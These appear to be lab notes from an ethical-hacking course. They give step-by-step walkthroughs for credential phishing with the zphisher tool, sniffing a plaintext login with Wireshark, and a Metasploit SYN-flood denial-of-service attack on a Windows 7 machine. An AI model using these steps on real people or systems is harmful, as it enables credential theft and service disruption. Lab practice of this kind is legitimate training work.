# Skill 1
use nmap for vulnerability assesment / open vas

or 

use phising option

# skill 2

### perform a phising attack

> search zphisher on the browser

copy the clone command and paste in the terminal

1. install the tool in the terminal using the git clone


2. go to zphisher directory
```bash
cd zphisher
```

3. run the tool
```bash
bash zphisher.sh
```

Let download all the requirements 

4. select the option u want for eg.
```bash 
2
```
5. select port forwarding as cloudfared that is 2.
but it shows error go with localhost that is 1
```bash
2
```
or
```bash
1
```
6. Select no if u dont want custom port
7. select no for custom url 
8. now share / open link in browser
9. Enter the login credentials and submit it
10. open terminal again and you can see the entered credentials

---
# skill 3

### Packet sniffing through wireshark 

1. open wireshark in kali
2. select eth0
3. open test.php in browser and login the page 
4. go back to wireshark 
5. At bookmark logo type following command
```bash
http.request.method=="POST"
```
6. scroll down and find post/userinfo.php http
7. click on it 
8. select HTML FORM urls u can see the pass & uname 


# Skill 4

### DDOS ATTACK ON system

1. open windows 7 machine
2. open kali terminal and start the msfconsole
```bash
sudo msfconsole
```
3. search synflood 
```bash
search synflood
```
4. set RHOST AS WINDOW7 IP
```bash
set RHOST win7_ip
```
5. set RPORT AS 139 For entrance of packets
```bash
set RPORT 139
```
6. run the attack
```bash
run
```
7. dont close terminal or else attack will stop
8. open wireshark and capture the packets
---
DONE !!!!!